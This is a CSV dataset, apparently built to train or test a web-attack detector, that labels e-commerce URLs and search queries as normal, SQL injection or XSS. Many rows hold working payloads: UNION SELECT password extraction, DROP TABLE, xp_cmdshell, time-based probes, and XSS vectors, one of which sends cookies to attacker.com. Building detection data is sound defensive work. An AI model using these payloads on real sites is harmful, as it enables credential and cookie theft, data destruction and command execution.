text,label,threat_type
search?q=catalog?page=2&sort=price_asc,0,NORMAL
search?q=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
redirect='><script>alert('PWNED')</script>,2,XSS
reviews?rating=5&verified=true,0,NORMAL
search?q=product?id=102&category=electronics,0,NORMAL
browse?tag=laptop,0,NORMAL
browse?tag=wireless+mouse,0,NORMAL
query=<marquee onstart=alert(1)>,2,XSS
"login?user="" OR ""1""=""1",1,SQL_INJECTION
comment='><script>alert('PWNED')</script>,2,XSS
"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
item/account/security/2fa-setup?ref=homepage,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
filter=admin' #,1,SQL_INJECTION
order/status?tracking=FEDEX-889922,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
query=profile/edit?name=Johnathan&page=1,0,NORMAL
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
mechanical keyboard,0,NORMAL
filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
search?q=1; DROP TABLE users--,1,SQL_INJECTION
apple macbook pro m2,0,NORMAL
redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
password123!,0,NORMAL
newsletter/subscribe?email=user@test.org,0,NORMAL
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
login?user=1' ORDER BY 1--+,1,SQL_INJECTION
<script>alert(1)</script>,2,XSS
index.html,0,NORMAL
<select autofocus onfocus=alert(1)>,2,XSS
filter?category=contact&sort=desc,0,NORMAL
<marquee onstart=alert(1)>,2,XSS
'><script>alert('PWNED')</script>,2,XSS
query=<body onload=alert('XSS')>,2,XSS
settings?theme=dark&lang=en,0,NORMAL
filter=' OR '1'='1,1,SQL_INJECTION
help/return-policy,0,NORMAL
account/security/2fa-setup,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
browse?tag=account/security/2fa-setup,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
1' ORDER BY 1--+,1,SQL_INJECTION
""" OR ""1""=""1",1,SQL_INJECTION
search?q=gaming+monitor,0,NORMAL
<svg onload=alert(1)>,2,XSS
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
login?user=admin' --,1,SQL_INJECTION
api/search?term=index.html,0,NORMAL
gaming monitor,0,NORMAL
filter?category=help/return-policy&sort=desc,0,NORMAL
filter?category=index.html&sort=desc,0,NORMAL
help/return-policy,0,NORMAL
item?id=admin' #,1,SQL_INJECTION
comment=<img src=x onerror=alert('XSS')>,2,XSS
comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
browse?tag=cart/checkout?step=billing,0,NORMAL
browse?tag=password123!,0,NORMAL
wireless mouse,0,NORMAL
filter=1' ORDER BY 3--+,1,SQL_INJECTION
about-us,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
admin_user_2024,0,NORMAL
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
item/john_doe?ref=homepage,0,NORMAL
search?q=admin' #,1,SQL_INJECTION
"redirect=""><script>alert(document.domain)</script>",2,XSS
') or ('1'='1'--,1,SQL_INJECTION
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
item?id=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
"item?id="" OR ""1""=""1",1,SQL_INJECTION
'><script>alert('PWNED')</script>,2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
admin'/*,1,SQL_INJECTION
profile/edit?name=Johnathan,0,NORMAL
browse?tag=john_doe,0,NORMAL
alice.smith@example.com,0,NORMAL
query=<isindex type=image src=1 onerror=alert(1)>,2,XSS
best headphones under 100,0,NORMAL
"item?id="" OR ""1""=""1",1,SQL_INJECTION
login?user=admin' #,1,SQL_INJECTION
search?q=mechanical+pencil+0.5mm,0,NORMAL
filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
<select autofocus onfocus=alert(1)>,2,XSS
"<video><source onerror=""javascript:alert(1)"">",2,XSS
home,0,NORMAL
login?user=' OR 'a'='a,1,SQL_INJECTION
item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
filter?category=index.html&sort=desc,0,NORMAL
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
"item?id=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
query=search?q=4k+oled+television+lg&page=1,0,NORMAL
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
query=<script>alert('XSS')</script>,2,XSS
query=view_order?order_id=983214&page=1,0,NORMAL
terms-and-conditions,0,NORMAL
search?q=assets/js/bundle.min.js,0,NORMAL
search?q=order/status?tracking=FEDEX-889922,0,NORMAL
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
api/search?term=dashboard?view=summary,0,NORMAL
images/banner-sale.jpg,0,NORMAL
search?q=1' ORDER BY 2--+,1,SQL_INJECTION
<details open ontoggle=alert(1)>,2,XSS
<body onload=alert('XSS')>,2,XSS
' OR '1'='1,1,SQL_INJECTION
assets/css/main.css,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
view_order?order_id=983214,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
python programming book,0,NORMAL
comment='><script>alert('PWNED')</script>,2,XSS
"filter="" OR ""1""=""1",1,SQL_INJECTION
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
item?id=1' AND SLEEP(10)--,1,SQL_INJECTION
"<video><source onerror=""javascript:alert(1)"">",2,XSS
settings?theme=dark&lang=en,0,NORMAL
api/search?term=products/audio/bluetooth-speakers,0,NORMAL
password123!,0,NORMAL
<script>alert('XSS')</script>,2,XSS
order/status?tracking=FEDEX-889922,0,NORMAL
query=profile/edit?name=Johnathan&page=1,0,NORMAL
"filter="" OR ""1""=""1",1,SQL_INJECTION
index.html,0,NORMAL
laptop,0,NORMAL
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
query=settings?theme=dark&lang=en&page=1,0,NORMAL
item/best+headphones+under+100?ref=homepage,0,NORMAL
alice.smith@example.com,0,NORMAL
<select autofocus onfocus=alert(1)>,2,XSS
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
<select autofocus onfocus=alert(1)>,2,XSS
order/status?tracking=FEDEX-889922,0,NORMAL
search?q=<input autofocus onfocus=alert(1)>,2,XSS
profile/edit?name=Johnathan,0,NORMAL
filter?category=contact&sort=desc,0,NORMAL
api/search?term=wireless+mouse,0,NORMAL
api/search?term=shoes+for+running,0,NORMAL
item/john_doe?ref=homepage,0,NORMAL
product?id=102&category=electronics,0,NORMAL
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
cart/checkout?step=billing,0,NORMAL
filter?category=newsletter/subscribe?email=user@test.org&sort=desc,0,NORMAL
admin'/*,1,SQL_INJECTION
' OR '1'='1,1,SQL_INJECTION
search?q=spring+sale+discount,0,NORMAL
contact,0,NORMAL
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
api/search?term=cart/checkout?step=billing,0,NORMAL
filter=1' ORDER BY 2--+,1,SQL_INJECTION
order/status?tracking=FEDEX-889922,0,NORMAL
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
) or ('1'='1,1,SQL_INJECTION
privacy-policy,0,NORMAL
item?id=' or 1=1/*,1,SQL_INJECTION
"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
products/audio/bluetooth-speakers,0,NORMAL
"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
"login?user=1' UNION SELECT null, null, null--",1,SQL_INJECTION
"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
item?id=admin'/*,1,SQL_INJECTION
login?user=' or 1=1/*,1,SQL_INJECTION
) or ('1'='1,1,SQL_INJECTION
product?id=102&category=electronics,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
filter?category=account/security/2fa-setup&sort=desc,0,NORMAL
api/search?term=privacy-policy,0,NORMAL
"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
<input autofocus onfocus=alert(1)>,2,XSS
<script>alert(1)</script>,2,XSS
1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
blog/post-10-cybersecurity-tips,0,NORMAL
"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
browse?tag=product?id=102&category=electronics,0,NORMAL
query=alice.smith@example.com&page=1,0,NORMAL
search?q=admin_user_2024,0,NORMAL
login?user=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
api/search?term=laptop,0,NORMAL
1' ORDER BY 1--+,1,SQL_INJECTION
'><script>alert('PWNED')</script>,2,XSS
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
comment=<details open ontoggle=alert(1)>,2,XSS
' HAVING 1=1 --,1,SQL_INJECTION
"comment=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
query=search?q=spring+sale+discount&page=1,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
browse?tag=products/audio/bluetooth-speakers,0,NORMAL
cotton t-shirt blue,0,NORMAL
wireless mouse,0,NORMAL
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
query=settings?theme=dark&lang=en&page=1,0,NORMAL
"search?q=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
wireless mouse,0,NORMAL
1; DROP TABLE users--,1,SQL_INJECTION
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
api/search?term=alice.smith@example.com,0,NORMAL
query=<img src=x onerror=alert('XSS')>,2,XSS
api/search?term=dashboard?view=summary,0,NORMAL
item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
1; DROP TABLE users--,1,SQL_INJECTION
search?q=gaming+monitor,0,NORMAL
search?q=shoes+for+running,0,NORMAL
browse?tag=terms-and-conditions,0,NORMAL
"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
query=gaming+monitor&page=1,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
browse?tag=contact,0,NORMAL
account/security/2fa-setup,0,NORMAL
<body onload=alert('XSS')>,2,XSS
laptop,0,NORMAL
browse?tag=gaming+monitor,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
cart/checkout?step=billing,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
product?id=102&category=electronics,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
' or 1=1/*,1,SQL_INJECTION
laptop,0,NORMAL
search?q=<script>alert(1)</script>,2,XSS
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
order/status?tracking=FEDEX-889922,0,NORMAL
item?id=admin' #,1,SQL_INJECTION
search?q=1' ORDER BY 1--+,1,SQL_INJECTION
"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
filter=1' ORDER BY 3--+,1,SQL_INJECTION
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
admin' #,1,SQL_INJECTION
browse?tag=profile/edit?name=Johnathan,0,NORMAL
filter=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
search?q=search?q=4k+oled+television+lg,0,NORMAL
item/apple+macbook+pro+m2?ref=homepage,0,NORMAL
filter?category=usb+c+cable+2m&sort=desc,0,NORMAL
wireless mouse,0,NORMAL
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
profile/edit?name=Johnathan,0,NORMAL
login?user=' OR 'a'='a,1,SQL_INJECTION
browse?tag=laptop,0,NORMAL
query=search?q=mechanical+pencil+0.5mm&page=1,0,NORMAL
view_order?order_id=983214,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
<marquee onstart=alert(1)>,2,XSS
search?q=<script>alert(1)</script>,2,XSS
query=assets/css/main.css&page=1,0,NORMAL
item/john_doe?ref=homepage,0,NORMAL
item/view_order?order_id=983214?ref=homepage,0,NORMAL
query=password123!&page=1,0,NORMAL
query=account/security/2fa-setup&page=1,0,NORMAL
search?q=blog/post-10-cybersecurity-tips,0,NORMAL
item/faq/shipping-times?ref=homepage,0,NORMAL
search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
1; DROP TABLE users--,1,SQL_INJECTION
filter=' or 1=1#,1,SQL_INJECTION
login?user=%27%20OR%201%3D1%20--,1,SQL_INJECTION
browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
search?q=<script>alert(1)</script>,2,XSS
item/cotton+t-shirt+blue?ref=homepage,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
laptop,0,NORMAL
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
browse?tag=download/specs-datasheet.pdf,0,NORMAL
filter?category=privacy-policy&sort=desc,0,NORMAL
query=download/specs-datasheet.pdf&page=1,0,NORMAL
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
api/search?term=assets/css/main.css,0,NORMAL
index.html,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
item/laptop?ref=homepage,0,NORMAL
filter=admin' --,1,SQL_INJECTION
<details open ontoggle=alert(1)>,2,XSS
search?q=<body onload=alert('XSS')>,2,XSS
"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
admin_user_2024,0,NORMAL
query=<img src=x onerror=alert('XSS')>,2,XSS
browse?tag=catalog?page=2&sort=price_asc,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
contact,0,NORMAL
item/laptop?ref=homepage,0,NORMAL
search?q=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
query=laptop&page=1,0,NORMAL
search?q=about-us,0,NORMAL
admin' --,1,SQL_INJECTION
"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
filter?category=password123!&sort=desc,0,NORMAL
item?id=admin'/*,1,SQL_INJECTION
browse?tag=gaming+monitor,0,NORMAL
item/order/status?tracking=FEDEX-889922?ref=homepage,0,NORMAL
filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
browse?tag=profile/edit?name=Johnathan,0,NORMAL
query=<svg/onload=alert('XSS')>,2,XSS
newsletter/subscribe?email=user@test.org,0,NORMAL
filter?category=admin_user_2024&sort=desc,0,NORMAL
query=terms-and-conditions&page=1,0,NORMAL
browse?tag=newsletter/subscribe?email=user@test.org,0,NORMAL
filter?category=settings?theme=dark&lang=en&sort=desc,0,NORMAL
reviews?rating=5&verified=true,0,NORMAL
search?q=mechanical+pencil+0.5mm,0,NORMAL
item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
api/search?term=alice.smith@example.com,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
account/security/2fa-setup,0,NORMAL
item/john_doe?ref=homepage,0,NORMAL
password123!,0,NORMAL
browse?tag=cotton+t-shirt+blue,0,NORMAL
'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
"redirect=<object data=""javascript:alert(1)"">",2,XSS
index.html,0,NORMAL
search?q=' OR '1'='1,1,SQL_INJECTION
login?user=admin' --,1,SQL_INJECTION
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
search?q=' OR 1=1 --,1,SQL_INJECTION
browse?tag=catalog?page=2&sort=price_asc,0,NORMAL
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
wireless mouse,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
item/gaming+monitor?ref=homepage,0,NORMAL
search?q=<body onload=alert('XSS')>,2,XSS
<script>alert(1)</script>,2,XSS
' OR 1=1 --,1,SQL_INJECTION
"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
terms-and-conditions,0,NORMAL
item/gaming+monitor?ref=homepage,0,NORMAL
search?q=home,0,NORMAL
item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
api/search?term=cotton+t-shirt+blue,0,NORMAL
"comment=""><script>alert(document.domain)</script>",2,XSS
<svg onload=alert(1)>,2,XSS
<isindex type=image src=1 onerror=alert(1)>,2,XSS
api/search?term=assets/js/bundle.min.js,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
search?q=settings?theme=dark&lang=en,0,NORMAL
dashboard?view=summary,0,NORMAL
filter?category=privacy-policy&sort=desc,0,NORMAL
browse?tag=reviews?rating=5&verified=true,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
usb c cable 2m,0,NORMAL
""" OR ""1""=""1",1,SQL_INJECTION
login?user=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
